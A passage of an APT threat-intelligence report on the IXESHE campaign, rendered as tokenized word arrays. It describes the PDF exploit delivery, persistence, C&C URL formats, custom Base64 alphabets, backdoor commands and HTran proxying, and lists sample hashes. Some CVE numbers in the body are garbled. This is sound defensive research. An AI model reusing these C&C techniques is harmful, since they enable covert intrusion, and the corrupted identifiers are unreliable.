"the", "victims\u2019", "corporate"], ["networks", "means", "very", "little", "C&C", "traffic", "leaves", "them", ".", "The"], ["attackers\u2019", "deliberate", "use", "of", "compromised", "machines", "and"], ["dynamic", "Domain", "Name", "System", "(DNS)", "services", "allows"], ["them", "to", "hide", "traces", "of", "their", "presence", "by", "confusing", "their"], ["activities", "with", "data", "belonging", "to", "legitimate", "individuals", "."], ["Looking", "at", "threat", "intelligence", "derived", "from", "tracking", "APT"], ["campaigns", "over", "time", "primarily", "based", "on", "the", "network"], ["traffic", "generated", "by", "the", "malware", "used", ",", "we", "were", "able"], ["to", "develop", "indicators", "of", "compromise", "for", "the", "IXESHE"], ["campaign", ".", "The", "malware", "samples", "used", "in", "this", "campaign"], ["were", "not", "very", "complicated", "by", "nature", "but", "do", "give", "the"], ["attackers", "almost", "complete", "control", "over", "their", "targets\u2019"], ["compromised", "systems", "."], ["Victims", "and", "Targets"], ["Most", "of", "the", "IP", "addresses", "of", "IXESHE\u2019s", "victims", "are", "linked"], ["to", "DSL", "networks", ",", "which", "made", "it", "difficult", "to", "determine"], ["their", "identities", ".", "Careful", "research", ",", "however", ",", "allowed", "the"], ["identification", "of", "some", "of", "the", "attackers\u2019", "victims:"], ["\u2022", "East", "Asian", "governments"], ["\u2022", "Taiwanese", "electronics", "manufacturers"], ["\u2022", "A", "telecommunications", "company"], ["Campaign", "victims", "were", "identified", "by", "using", "Whois", "records"], ["and", "open", "source", "research", ".", "Trend", "Micro", "generally", "notifies"], ["customers", "that", "are", "believed", "to", "have", "been", "specifically"], ["targeted", "by", "APT", "campaigns", "."], ["Context"], ["The", "IXESHE", "attackers", "have", "been", "actively", "launching", "highly"], ["targeted", "attacks", "since", "at", "least", "July", "2009", "."], ["PAGE", "2", "|", "IXESHE"], ["Attack", "Vectors"], ["Available", "data", "on", "the", "IXESHE", "campaign", "indicates", "that"], ["targeted", "emails", "with", "malicious", "", ".", "PDF", "file", "attachments", "were"], ["the", "attackers\u2019", "vector", "of", "choice", ".", "In", "most", "cases", ",", "the", "attacks"], ["involved", "Adobe", "Acrobat", ",", "Reader", ",", "and", "Flash", "Player", "exploits"], ["such", "as:"], ["\u2022", "CVE-2009-43243"], ["\u2022", "CVE-2009-09274"], ["\u2022", "CVE-2011-06095"], ["\u2022", "CVE-2011-06116"], ["It", "should", "also", "be", "noted", "that", "this", "campaign", "used", "CVE-2009-"], ["43247"], ["and", "CVE-2011-06098", "exploits", "when", "these", "were", "still"], ["unpatched", "or", "considered", "zero-day", "vulnerabilities", "."], ["The", "IXESHE", "attackers", "also", "used", "an", "exploit", "that", "affected"], ["Microsoft", "Excel\u2014CVE-2009-3129", ".", "9"], ["Operations"], ["The", "IXESHE", "malware", "binary", "allowed", "the", "attackers", "to"], ["easily", "take", "over", "and", "maintain", "complete", "control", "of", "victims\u2019"], ["systems", "to", "do", "the", "following:"], ["\u2022", "List", "all", "services", ",", "processes", ",", "and", "drives"], ["\u2022", "Terminate", "processes", "and", "services"], ["\u2022", "Download", "and", "upload", "files"], ["\u2022", "Start", "processes", "and", "services"], ["\u2022", "Get", "victims\u2019", "user", "names"], ["\u2022", "Get", "a", "machine\u2019s", "name", "and", "domain", "name"], ["\u2022", "Download", "and", "execute", "arbitrary", "files"], ["\u2022", "Cause", "a", "system", "to", "pause", "or", "sleep", "for", "a", "specified"], ["number", "of", "minutes"], ["\u2022", "Spawn", "a", "remote", "shell"], ["\u2022", "List", "all", "current", "files", "and", "directories"], ["3", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4324"], ["4", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0927"], ["5", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0609"], ["6", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0611"], ["7", "http://contagiodump", ".", "blogspot.com/2009/12/dec-18-adobe-0-day-cve2009-4324-pdf.html"], ["8", "http://contagiodump", ".", "blogspot.ca/2011/03/cve-2011-0609-adobe-flashplayer.html"], ["9", "http://cve", ".", "mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3129"], ["TECHNICAL", "ANALYSIS"], ["Initial", "Delivery", "Method"], ["Every", "IXESHE", "case", "we", "examined", "revealed", "that", "the", "original"], ["infection", "vector", "was", "a", "targeted", "email", "with", "a", "PDF", "exploit", "as"], ["attachment", ".", "Older", "versions", "also", "used", "an", "XLS", "exploit", "."], ["Opening", "the", "", ".", "PDF", "file", "drops", "and", "executes", "a", "malware", "in", "a"], ["victim\u2019s", "system", ".", "The", "malware", "displays", "a", "blank", "", ".", "PDF", "file", "or", "a"], ["decoy", "document", "related", "to", "the", "targeted", "attack", ".", "The", "emails"], ["normally", "come", "from", "compromised", "personal", "accounts", "or"], ["are", "entirely", "spoofed", ".", "Emails", "from", "spoofed", "senders", "were"], ["usually", "sent", "via", "mail", "servers", "in", "the", "United", "States", "and"], ["China", "."], ["Malware", "Local", "System", "Effects"], ["Once", "dropped", "onto", "target", "systems", "by", "means", "of", "a"], ["document", "exploit", "attached", "to", "a", "tailored", "email", ",", "the", "malware"], ["drops", "an", "executable", "file", "into", "one", "of", "the", "following", "folders:"], ["\u2022", "%APPDATA%\\Locations\\"], ["\u2022", "%APPDATA%\\Adobe"], ["\u2022", "%TEMP%"], ["The", "malware", "also", "sets", "the", "executable", "file\u2019s", "attributes"], ["to", "\u201cHidden", ".", "\u201d", "Some", "of", "the", "file", "names", "the", "attackers", "used"], ["include:"], ["\u2022", "winhlps", ".", "exe"], ["\u2022", "acrotry", ".", "exe"], ["\u2022", "AcroRd32", ".", "exe"], ["\u2022", "Updater", ".", "exe"], ["In", "order", "for", "the", "malware", "to", "survive", "rebooting", ",", "it", "normally"], ["creates", "the", "following", "registry", "run", "key:"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\"], ["CurrentVersion\\Run"], ["The", "registry", "run", "key", ",", "in", "turn", ",", "points", "to", "the", "malware", "that"], ["has", "been", "dropped", ".", "The", "value", "name", "of", "this", "entry", "varies"], ["from", "sample", "to", "sample", ".", "Some", "of", "the", "names", "the", "attackers"], ["used", "for", "it", "include:"], ["\u2022", "Adobe", "Assistant"], ["\u2022", "Migrated"], ["PAGE", "3", "|", "IXESHE"], ["Some", "samples", ",", "however", ",", "do", "not", "use", "a", "registry", "run", "key", "as"], ["load", "point", ".", "Some", "of", "the", "more", "recent", "samples", "we", "observed"], ["create", "a", "shortcut", "(i", ".", "e.,", "", ".", "LNK", "file)", "in", "the", "Startup", "folder", "with"], ["names", "such", "as", "adobe", "reader", "speed", "launch", ".", "lnk."], ["The", "malware", "also", "checks", "a", "system\u2019s", "proxy", "settings", "for"], ["later", "use", "in", "C&C", "communications:"], ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\"], ["CurrentVersion\\Internet", "Settings"], ["ProxyEnable"], ["ProxyServer"], ["C&C", "Communications"], ["Upon", "installation", ",", "the", "malware", "starts", "communicating"], ["with", "one", "of", "its", "C&C", "servers", ".", "Most", "of", "the", "samples"], ["appeared", "to", "have", "at", "least", "three", "C&C", "servers", "hard", "coded"], ["for", "redundancy", ".", "The", "C&C", "communications", "are", "easy", "to"], ["identify", ",", "as", "these", "tended", "to", "be", "coded", "in", "the", "following"], ["predetermined", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", "."], ["jsp", "?", "[Encrypted", "Base64", "Blob]"], ["Some", "samples", "alternatively", "use", "an", "FGKD", ".", "jsp", "or", "an", "FPK", ".", "jsp"], ["file", "."], ["The", "Base64", "blob", "is", "of", "particular", "interest", ".", "It", "makes", "use", "of", "a"], ["custom", "Base64", "alphabet", ".", "Once", "decoded", ",", "this", "blob", "reveals"], ["a", "standardized", "structure", "of", "the", "information", "sent", "to", "the"], ["registered", "C&C", "server", ",", "which", "includes", "the", "following", "details:"], ["\u2022", "Computer", "name"], ["\u2022", "Local", "IP", "address"], ["\u2022", "Proxy", "server", "IP", "and", "port"], ["\u2022", "Malware", "ID"], ["To", "date", ",", "we", "have", "seen", "several", "custom", "Base64", "alphabets", ","], ["including:"], ["\u2022", "+NO5RZaGHviIjhYq8b4ndQ=p012ySTcCDrs/xPgUz67F"], ["M3wemKfkJLBo9VtWXlEuA"], ["\u2022", "HZa4vjIiGndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "j4vpGZaHnIdQ=i012y+N/zPgUO5RSTx67FMhYb8q3we"], ["mKckJLBofCDrs9VtWXlEu"], ["\u2022", "p12kJLBofCDrs9VtWXlEuainyj4vd+=H0GZIQNO5RST/"], ["zPgUx67FMhYb8q3wemKc"], ["\u2022", "aZHGviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "ZvQIajHi4ndG=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "ZaGHviIj4ndQ=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "4HIvZGjaiQdn=p012y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "pGIaHnZj0vdQ=i421y+NO5RSY/zMgUx67KPhTb8q3we"], ["mFckBLJufWErs9VtCXlDo"], ["\u2022", "QpaZIivj4ndG=H021y+NO5RST/xPgUz67FMhYq8b3we"], ["mKfkJLBocCDrs9VtWXlEu"], ["\u2022", "pGZaHnIj4vdQ=i012y+NO5RST/zPgUx67FMhYb8q3we"], ["mKckJLBofCDrs9VtWXlEu"], ["Some", "similarities", "exist", "across", "different", "versions", "of", "the"], ["Base64", "alphabet", ",", "which", "indicates", "that", "these", "are", "most"], ["likely", "not", "completely", "randomly", "generated", ".", "Instead", ",", "the"], ["attackers", "manually", "cut", "and", "pasted", "older", "versions", "after"], ["altering", "some", "parts", "."], ["The", "malware", "ID", "seems", "to", "be", "a", "campaign", "code", "with", "a"], ["different", "IP", "address", "for", "each", "attack", ".", "Some", "of", "the", "campaign"], ["codes", "we", "have", "seen", "include:"], ["\u2022", "19"], ["\u2022", "[0222]"], ["\u2022", "[0713]"], ["\u2022", "[0802]"], ["\u2022", "[CR1008]"], ["\u2022", "[CR1031]"], ["\u2022", "[CZ0312]"], ["\u2022", "[CZ0913]"], ["\u2022", "[CZ0921]"], ["\u2022", "[LY]MAIL_20090923"], ["\u2022", "[LY]MAIL_20091015"], ["\u2022", "[LY]MAIL_20091208"], ["\u2022", "[LY0406]"], ["\u2022", "[LY0420]"], ["\u2022", "[LY0816]"], ["\u2022", "[LY1207]"], ["\u2022", "[TL1109]"], ["\u2022", "[WH0827]"], ["\u2022", "[WH1122]"], ["\u2022", "[WL1013]"], ["\u2022", "[WZ1011]"], ["\u2022", "CRML_0505"], ["\u2022", "CRML_MIL"], ["\u2022", "Firebox4"], ["\u2022", "JUST_0525"], ["\u2022", "JUST_JP_6080"], ["\u2022", "KA_1016"], ["\u2022", "KS_0602"], ["\u2022", "KSX_0520"], ["\u2022", "LY_ML0430_30m"], ["\u2022", "ly0610"], ["\u2022", "MAIL_20091208"], ["\u2022", "MAIL_JAP_0220"], ["\u2022", "MAIL_JAP_0304"], ["\u2022", "MAIL_JAP_0325"], ["\u2022", "MAIL_JAP_0407"], ["\u2022", "MAIL0524"], ["\u2022", "manufact"], ["\u2022", "ML_20091223"], ["\u2022", "ML0419", ".", "_30m"], ["\u2022", "ML0623", ".", "LINK_10m"], ["\u2022", "ML0628"], ["\u2022", "ML_20091216"], ["\u2022", "ML_20091223"], ["\u2022", "MW0629"], ["\u2022", "OM222"], ["\u2022", "sandbox"], ["\u2022", "sandbox4"], ["\u2022", "sandbox6"], ["\u2022", "success"], ["\u2022", "UNKNOWN"], ["\u2022", "wl0711"], ["\u2022", "ZWJP_KS_1222"], ["It", "appears", "that", "the", "numbers", "in", "the", "given", "campaign", "codes"], ["refer", "to", "dates", "when", "the", "campaigns", "were", "launched", "in"], ["\u201cMMDD\u201d", "format", ".", "The", "letters", "are", "possibly", "related", "to", "the"], ["target", "industry", "or", "company", "."], ["PAGE", "4", "|", "IXESHE"], ["If", "the", "malware", "does", "not", "get", "a", "response", "from", "the", "C&C"], ["server", ",", "it", "will", "choose", "another", "random", "number", "after", "the"], ["AWS", "part", "of", "the", "URL", "and", "try", "again", "."], ["Once", "connected", ",", "the", "malware", "specifically", "waits", "for", "the"], ["remote", "server", "to", "issue", "the", "following", "commands", ",", "which"], ["may", "vary", "from", "one", "version", "to", "another:"], ["\u2022", "del", "[parameter]:", "Allows", "a", "remote", "user", "to", "delete", "files", "."], ["\u2022", "disk", "[parameter]:", "Lists", "all", "available", "drives", "."], ["\u2022", "dos", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["commands", "via", "cmd", ".", "exe."], ["\u2022", "get", "[parameter]:", "Allows", "a", "remote", "user", "to", "download", "a"], ["file", "from", "the", "remote", "server", "onto", "a", "local", "machine", "."], ["\u2022", "list", "[parameter]:", "Lists", "files", "on", "the", "victim\u2019s", "machine", "."], ["\u2022", "ls", "[parameter]:", "Allows", "a", "remote", "user", "to", "display", "the"], ["contents", "of", "a", "directory", "."], ["\u2022", "kill", "[parameter]:", "Allows", "a", "remote", "user", "to", "terminate"], ["processes", "."], ["\u2022", "put", "[parameter]:", "Allows", "a", "remote", "user", "to", "upload", "a", "file"], ["from", "a", "local", "machine", "to", "a", "remote", "server", "."], ["\u2022", "rsh", "[parameter]:", "Similar", "to", "the", "sh", "or", "dos", "[parameter]"], ["except", "for", "the", "fact", "that", "this", "is", "an", "already-existing", "file"], ["or", "shell", "."], ["\u2022", "run", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["programs", "."], ["\u2022", "sh", "[parameter]:", "Allows", "a", "remote", "user", "to", "execute"], ["commands", "via", "cmd", ".", "exe."], ["\u2022", "sleep", "[parameter]:", "Causes", "a", "system", "to", "sleep", "for", "a"], ["certain", "amount", "of", "time", "."], ["Related", "AES", "Campaign"], ["We", "have", "also", "been", "tracking", "another", "campaign", ",", "which"], ["we", "refer", "to", "as", "the", "\u201cAES", "campaign", ",", "\u201d", "which", "appears", "to", "be"], ["related", "to", "IXESHE", ".", "The", "main", "body", "of", "the", "malware", "related"], ["to", "the", "IXESHE", "campaign", "can", "be", "identified", "by", "its", "connection"], ["to", "a", "C&C", "server", "using", "a", "file", "such", "as", "AWS12345", ".", "jsp", "and", "a"], ["custom", "Base64", "blob;", "the", "malware", "associated", "with", "the"], ["AES", "campaign", "operates", "very", "similarly", ".", "The", "samples", "used"], ["in", "the", "AES", "campaign", "slightly", "differed", "in", "terms", "of", "C&C"], ["communication", "but", "had", "significant", "similarities", "with", "IXESHE"], ["malware", ",", "which", "used", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "ES[Some", "Numbers]", ".", "jsp"], ["Even", "though", "the", "network", "traffic", "format", "of", "the", "AES"], ["campaign", "was", "slightly", "similar", ",", "instead", "of", "the", "more", "familiar"], ["AWS[random]", ".", "jsp", "format", ",", "it", "used", "several", "other", "formats", "for"], ["certain", "commands", "or", "events", "such", "as:"], ["\u2022", "AES:", "Initial", "beacon", "."], ["\u2022", "DES:", "Send", "the", "path", "of", "%systemdir%", "."], ["\u2022", "PES:", "Send", "the", "result", "of", "the", "\u201cput\u201d", "command", "."], ["\u2022", "SEU:", "Send", "the", "\u201cerror\u201d", "or", "\u201cinvalid\u201d", "command", "."], ["\u2022", "SUS:", "Send", "the", "system", "name", ",", "which", "is", "not", "encoded", ","], ["upon", "receiving", "the", "\u201cexit\u201d", "command", "."], ["\u2022", "ZES:", "Send", "the", "result", "of", "the", "\u201cdos\u201d", "command", "."], ["Another", "difference", "in", "the", "traffic", "is", "that", "AWS", "uses", "the", "POST"], ["method", "with", "the", "format", ",", "\u201chttp://[C&C", "Server]/FPK", "[Some"], ["Numbers]", ".", "jsp?[Base64", "Blob]", ",", "\u201d", "when", "the", "\u201cget\u201d", "command", "is"], ["invoked", ".", "The", "Base64", "blob", "contains", "the", "file", "specified", "in", "the"], ["\u201cget\u201d", "command", "."], ["Analysis", "of", "the", "binaries", "also", "revealed", "similarities", "between"], ["the", "AES", "and", "AWS", "samples", ".", "These", "included", "the", "encoding"], ["algorithm", "and", "commands", "used", ".", "Even", "though", "some"], ["commands", "varied", ",", "the", "format", "and", "parameters", "used"], ["essentially", "remained", "the", "same", "."], ["PAGE", "5", "|", "IXESHE"], ["C&C", "INFRASTRUCTURE"], ["The", "majority", "of", "the", "IXESHE", "campaign\u2019s", "C&C", "servers", "were", "based", "in", "Taiwan", "and", "the", "United", "States", "."], ["Figure", "1", ".", "Breakdown", "of", "C&C", "servers", "by", "country"], ["PAGE", "6", "|", "IXESHE"], ["This", "is", ",", "however", ",", "not", "an", "indicator", "of", "attribution", ".", "It", "is", "not"], ["possible", "to", "determine", "where", "the", "attackers", "are", "based", "solely"], ["on", "where", "their", "C&C", "infrastructures", "are", "located", ".", "In", "addition", ","], ["not", "all", "of", "the", "C&C", "servers", "are", "currently", "active", ".", "Many", ",", "if"], ["not", "all", "of", "them", ",", "appear", "to", "be", "compromised", "machines", ".", "In"], ["fact", ",", "at", "least", "11", "of", "the", "C&C", "servers", "were", "hosted", "on", "the"], ["compromised", "machines", "of", "an", "East", "Asian", "government", ","], ["which", "made", "these", "very", "useful", "for", "launching", "targeted"], ["attacks", "against", "it", "."], ["Most", "of", "the", "malware", "samples", "directly", "accessed", "an", "IP"], ["address", "as", "a", "C&C", "server", ".", "Connections", "to", "domains", "did"], ["exist", "in", "some", "cases", ".", "The", "domains", "were", "usually", "registered"], ["using", "free", "dynamic", "DNS", "service", "providers", "or", "compromised"], ["websites", "."], ["Overall", ",", "this", "strategy", "was", "part", "of", "the", "attackers\u2019", "modus"], ["operandi", ".", "By", "choosing", "compromised", "machines", "to", "act", "as"], ["C&C", "servers", ",", "fewer", "clues", "were", "left", "for", "investigators", "to"], ["follow", "in", "an", "attempt", "to", "find", "out", "who", "is", "behind", "the", "attacks"], ["compared", "with", "those", "using", "bulletproof", "hosting", "services"], ["and", "registered", "domain", "names", ".", "To", "conduct", "research", "on"], ["these", "servers", ",", "investigators", "need", "to", "differentiate", "between"], ["information", "related", "to", "malicious", "and", "legitimate", "use", "."], ["Real", "C&C", "Location"], ["One", "very", "interesting", "error", "revealed", "more", "insights", "into"], ["the", "C&C", "network\u2019s", "setup", ".", "One", "of", "the", "malware", "samples", "we"], ["tested", "was", "designed", "to", "access", "xxx", ".", "xxawan.com", "via", "port"], ["443", ",", "which", ",", "at", "that", "time", ",", "resolved", "to", "xx", ".", "xxx.114.87:443,", "a"], ["server", "located", "in", "the", "United", "States", ".", "The", "sample", ",", "however", ","], ["received", "the", "following", "error", "message", "from", "the", "server:"], ["[SERVER]connection", "to", "xx", ".", "xx.x2.202:56413", "error"], ["This", "indicated", "that", "the", "front-end", "servers", "actually"], ["functioned", "as", "proxy", "servers", "and", "that", "the", "true", "C&C", "servers"], ["were", "hidden", "behind", "this", "initial", "group", "of", "C&C", "servers", "."], ["This", "made", "the", "network", "more", "resistant", "to", "takedown", "and"], ["analysis", ".", "Due", "to", "a", "server", "error", ",", "however", ",", "the", "attackers"], ["revealed", "the", "location", "of", "one", "of", "their", "back-end", "servers", ".", "We"], ["discovered", "that", "the", "IP", "address", ",", "xx", ".", "xx.x2.202,", "is", "located", "in"], ["Guangdong", ",", "China", "."], ["The", "particular", "error", "returned", "looked", "very", "similar", "to", "errors"], ["generated", "by", "a", "tool", "called", "\u201cHTran", ".", "\u201d10", "HTran", "stands", "for"], ["\u201cHUC", "Packet", "Transmit", "Tool", ",", "\u201d", "a", "connection", "bouncer", "that"], ["redirects", "TCP", "traffic", "destined", "for", "one", "host", "to", "an", "alternate"], ["host", ",", "keeping", "the", "real", "host", "hidden", "from", "view", ".", "\u201cHUC", ",", "\u201d", "in"], ["this", "case", ",", "stands", "for", "the", "hacking", "group", ",", "\u201cHonker", "Union"], ["of", "China", ".", "\u201d", "It", "was", "coded", "by", "a", "hacker", "who", "goes", "by", "the"], ["handle", "\u201clion", ".", "\u201d", "This", "tool\u2019s", "error-checking", "code", ",", "however", ",", "is"], ["flawed", ".", "Assuming", "that", "everything", "properly", "works", ",", "the", "tool"], ["functions", "very", "well", "as", "a", "proxy", "server", "but", "if", "the", "real", "server"], ["is", "currently", "inaccessible", ",", "HTran", "will", "send", "an", "error", "message", ","], ["revealing", "its", "whereabouts", "."], ["Running", "a", "port", "scan", "on", "this", "server", "revealed", "some", "open"], ["ports", "shown", "in", "the", "table", "below", "."], ["Port", "State", "Service"], ["80/tcp", "Open", "HTTP"], ["8080/tcp", "Open", "HTTP", "Alternative"], ["Based", "on", "OS", "fingerprinting", ",", "the", "server", "appears", "to", "be"], ["running", "Windows", "7", "Enterprise", "Server", ".", "With", "only", "a", "few"], ["open", "ports", ",", "however", ",", "it", "was", "very", "difficult", "to", "confirm", "this", ".", "In"], ["addition", ",", "we", "did", "not", "receive", "a", "response", "when", "we", "tried", "to"], ["connect", "to", "these", "ports", "."], ["10", "http://www", ".", "secureworks.com/research/threats/htran/"], ["PAGE", "7", "|", "IXESHE"], ["ATTRIBUTION", "AND", "UNIQUE"], ["FINGERPRINTS"], ["Previous", "research", "on", "the", "IXESHE", "campaign", "indicated"], ["several", "connections", "to", "groups", "possibly", "from", "China", ".", "In"], ["addition", ",", "the", "IP", "address", "hiding", "behind", "the", "HTran", "instance"], ["was", "an", "IP", "range", "assigned", "to", "China", "."], ["Upon", "further", "investigation", "of", "the", "\u201cmanufact\u201d", "campaign", ","], ["however", ",", "it", "appears", "that", "the", "gang", "behind", "it", "may", "be", "English"], ["speakers", ".", "The", "name", "of", "the", "campaign", ",", "for", "one", ",", "is", "most", "likely"], ["a", "shortened", "form", "of", "\u201cmanufacturing", ".", "\u201d", "The", "OS", "the", "C&C"], ["server", "uses", "is", "also", "an", "English", "install", "of", "Microsoft", "XP", ".", "It", "is"], ["also", "likely", ",", "of", "course", ",", "that", "the", "C&C", "server", "is", "a", "compromised"], ["machine", "so", "it", "does", "not", "use", "the", "attackers\u2019", "first", "language", "."], ["The", "malware", "samples", ",", "which", "appear", "to", "have", "been"], ["developed", "using", "C++", ",", "had", "a", "number", "of", "strings", "and", "error"], ["codes", "in", "English", "such", "as", "\u201cEnter", "command\u201d", "and", "\u201cReceive"], ["command", "error", "!", "\u201d"], ["The", "date", "format", "used", "in", "the", "campaign", "codes", "(i", ".", "e.,", "MMDD)"], ["also", "provided", "us", "a", "clue", "as", "to", "where", "the", "attackers", "may", "be"], ["from", ".", "This", "date", "format", "is", "only", "commonly", "used", "in", "China", ","], ["Korea", ",", "Iran", ",", "Japan", ",", "Hungary", ",", "Lithuania", ",", "and", "the", "United"], ["States", "."], ["Based", "on", "the", "limited", "amount", "of", "information", "we", "gathered"], ["about", "the", "attackers", ",", "it", "was", "very", "difficult", "to", "pinpoint", "their"], ["exact", "location", "."], ["Unique", "Fingerprints", "and", "Modus", "Operandi"], ["An", "attack", "can", "be", "considered", "associated", "with", "the", "gang"], ["behind", "the", "IXESHE", "campaign", "if", "it", "exhibits", "the", "following"], ["characteristics:"], ["\u2022", "Uses", "a", "specially", "crafted", "targeted", "email", "with", "a"], ["malicious", "file", "attachment"], ["\u2022", "Uses", "document", "exploits", ",", "primarily", "", ".", "PDF", "files", ",", "to", "drop"], ["malware", "into", "target", "systems"], ["\u2022", "Uses", "malware", "detected", "by", "security", "vendors", "as", "IXESHE"], ["variants"], ["\u2022", "Uses", "a", "malware", "that", "sends", "a", "GET", "request", "to", "the", "C&C"], ["server", "in", "the", "following", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some"], ["Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["\u2022", "Uses", "dynamic", "DNS", "services", "for", "or", "compromised"], ["machines", "as", "C&C", "servers"], ["PAGE", "8", "|", "IXESHE"], ["RELATIONSHIPS", "BETWEEN", "ATTACK", "COMPONENTS"], ["Figure", "2", ".", "IXESHE", "targeted", "campaign", "#1"], ["Figure", "3", ".", "IXESHE", "targeted", "campaign", "#2"], ["PAGE", "9", "|", "IXESHE"], ["Figure", "4", ".", "IXESHE", "targeted", "campaign", "#3"], ["PAGE", "10", "|"], ["IXESHE"], ["Figure", "5", ".", "IXESHE", "targeted", "campaign", "#4"], ["Figure", "6", ".", "IXESHE", "targeted", "campaign", "#5"], ["PAGE", "11", "|", "IXESHE"], ["PAGE", "12", "|", "IXESHE"], ["TIMELINE"], ["This", "section", "lists", "known", "incidents", "exhibiting", "the", "same"], ["threat", "actor", "behaviors", "and", "so", "may", "be", "from", "the", "same"], ["group", "behind", "IXESHE", "dating", "to", "as", "far", "back", "as", "July"], ["2009", ".", "With", "the", "exception", "of", "the", "samples", "described", "in"], ["ContagioDump", ",", "the", "dates", "for", "other", "samples", "refer", "to", "when"], ["the", "respective", "sandboxes", "saw", "them", "for", "the", "first", "time", ".", "As"], ["such", ",", "these", "dates", "should", "be", "considered", "\u201cat", "least", "by\u201d", "and"], ["not", "the", "actual", "date", "of", "the", "attack", "."], ["\u2022", "15", "October", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "\u4e2d\u5171\u4e8c\u70ae\u90e8\u968a\u5c0e\u5f48\u4e4b\u767c\u5c55"], ["\u2022", "MD5:", "16a9f340c0d353332ba6f525376c93e1"], ["\u2022", "C&C:", "xxxxxupsenter", ".", "byinter.net"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["oct-15-2009-attack-of-day-development", ".", "html"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20091015"], ["\u2022", "18", "December", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "\u5973\u5175\u812b\u8863\u6bd4\u4e2d\u6307", "\u62cd\u7167PO"], ["\u4e0a\u7db2"], ["\u2022", "MD5:", "8950bbedf4a7f1d518e859f9800f9347"], ["\u2022", "C&C:", "xxxxxfo", ".", "athersite.com"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["dec-18-adobe-0-day-cve-2009-4324-pdf", ".", "html"], ["\u2022", "Campaign", "code:", "ML_20091216"], ["\u2022", "28", "December", "2009"], ["\u2022", "PDF", "name/Subject", "hook:", "Consumer", "Welfare", "Table"], ["\u2022", "MD5:", "c61c231d93d3bd690dd04b6de7350abb"], ["\u2022", "C&C:", "xxx", ".", "xx6.148.42", "or", "xxx", ".", "xx6.202.49"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2009/12/"], ["dec-29-cve-2009-4324-adobe-0-day", ".", "html"], ["\u2022", "Campaign", "code:", "ML_20091223"], ["\u2022", "26", "April", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[\u7814\u8a0e\u6703]\u958b\u5357\u5927\u5b78\u516c\u5171\u4e8b"], ["\u52d9\u7ba1\u7406\u5b78\u7cfb\u7b2c\u4e94\u5c46\u300c\u5168\u7403\u5316\u8207\u884c\u653f\u6cbb\u7406\u300d\u570b\u969b\u5b78\u8853"], ["\u7814\u8a0e\u6703"], ["\u2022", "MD5:", "58de08c1155a775b760049dff3f5abe4"], ["\u2022", "C&C:", "xxx", ".", "x.x5.26"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/04/"], ["apr-26-cve-2009-4324-w-low-detection", ".", "html"], ["\u2022", "Campaign", "code:", "ML0419", ".", "_30m"], ["\u2022", "6", "May", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "\u8521\u653f\u6587\u6559\u6388\u4e03\u5341\u83ef\u8a95\u7cfb\u5217"], ["\u6d3b\u52d5\u7c21\u5831"], ["\u2022", "MD5:", "d80eb21cfe8ad1a710c8652b13f8b7ac"], ["\u2022", "C&C:", "xxx", ".", "xx9.124.13"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/05/"], ["may-6-cve-2010-0188-pdf-birthday", ".", "html"], ["\u2022", "Campaign", "code:", "LY_ML0430_30m"], ["\u2022", "10", "May", "2010"], ["\u2022", "XLS", "name/Subject", "hook:", "99\u4e0b\u534a\u5e74\u570b\u9632\u5de5\u696d\u8a55\u9451"], ["\u65e5\u671f\u8868"], ["\u2022", "MD5:", "d4b98bda9c3ae0810a61f95863f4f81e"], ["\u2022", "C&C:", "xxxxx", ".", "compreautos.com.br"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/06/"], ["may-10-cve-2009-3129-xls-schedule-of", ".", "html"], ["\u2022", "Campaign", "code:", "CRML_0505"], ["\u2022", "8", "June", "2010"], ["\u2022", "XLS", "name/Subject", "hook:", "\u5929\u5b89\u8266\u5f8c\u7684\u671d\u9bae\u534a\u5cf6\u65b0"], ["\u5c40\u52e2"], ["\u2022", "MD5:", "100cf902ac31766f7d8a521eeb6f8d68"], ["\u2022", "C&C:", "xxx", ".", "xx.187.130"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/06/"], ["jun-8-cve-2009-4324-korean-peninsula", ".", "html"], ["\u2022", "Campaign", "code:", "MAIL0524"], ["\u2022", "27", "June", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Discussion", "on", "CrossStrait", "Maritime", "Cooperation"], ["\u2022", "MD5:", "6e14c7a424c2eef7f37810ff65650837"], ["\u2022", "C&C:", "xxx", ".", "xx.128.71"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/07/"], ["jun-27-cve-2009-0927-pdf-discussion-on", ".", "html"], ["\u2022", "Campaign", "code:", "ML0628"], ["\u2022", "1", 